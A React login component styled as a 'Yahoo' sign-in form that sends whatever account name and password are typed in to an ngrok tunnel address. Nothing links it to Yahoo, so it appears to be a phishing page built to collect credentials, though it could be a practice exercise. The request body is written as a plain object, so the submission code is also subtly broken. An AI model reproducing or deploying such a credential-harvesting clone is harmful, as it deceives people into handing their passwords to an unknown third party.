import React, { useRef, useState } from 'react';
import styled from 'styled-components';

const LoginInfo = () => {
  const accountRef = useRef(null);
  const passwordRef = useRef(null);
  const [accountHint, setAccountHint] = useState(null);

  const handleAccountInput = (e) => {
    if (accountRef.current.value === '') {
      setAccountHint('請輸入姓名');
    } else {
      setAccountHint(null);
    }
  };

  const validatePassword = (password) => {
    const passwordPattern = /^(?=.*\d)[\da-zA-Z]{8,}$/;
    if (password.match(passwordPattern) !== null) return true;
  };

  const postResult = async () => {
    return fetch('https://abd55765f89b.ngrok.io/int/success', {
      method: 'POST',
      body: {
        account: accountRef.current.value,
        password: passwordRef.current.value,
      },
    }).then((res) => res.json());
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    const password = passwordRef.current.value;
    const isValidated = validatePassword(password);
    if (isValidated) {
      postResult();
      accountRef.current.value = '';
      passwordRef.current.value = '';
    } else {
      console.log('error');
    }
  };

  return (
    <LoginContainer>
      <Title>Yahoo</Title>
      <Form action="">
        <InputWrapper>
          <Label htmlFor="">Account</Label>
          <Input ref={accountRef} onChange={handleAccountInput} />
          {accountHint && <HintText>{accountHint}</HintText>}
        </InputWrapper>
        <InputWrapper>
          <Label htmlFor="">Password</Label>
          <Input ref={passwordRef} />
        </InputWrapper>
        <SubmitButton onClick={handleSubmit}>Sign in</SubmitButton>
      </Form>
    </LoginContainer>
  );
};

const LoginContainer = styled.div`
  margin: 0 auto;
`;

const Title = styled.h2`
  font-size: 28px;
  text-align: center;
`;

const Form = styled.form`
  width: 200px;
`;

const InputWrapper = styled.div`
  margin-bottom: 20px;
  display: flex;
  align-items: flex-start;
  flex-direction: column;
  margin-bottom: 40px;
  width: 100%;
`;

const Label = styled.label`
  margin-bottom: 5px;
  font-size: 14px;
  color: gray;
`;

const Input = styled.input`
  display: block;
  outline: none;
  border: none;
  border-bottom: 1px solid black;
  width: 100%;
  font-size: 16px;
`;

const SubmitButton = styled.button`
  border: 1px solid blue;
  background-color: blue;
  padding: 10px 15px;
  color: white;
  border-radius: 4px;
  transition: all 0.3s ease-in-out;

  &:hover {
    background-color: lightBlue;
    border-color: lightblue;
    transition: all 0.3s ease-in-out;
    cursor: pointer;
    color: black;
  }
`;

const HintText = styled.p`
  font-size: 12px;
  color: red;
`;

export default LoginInfo;
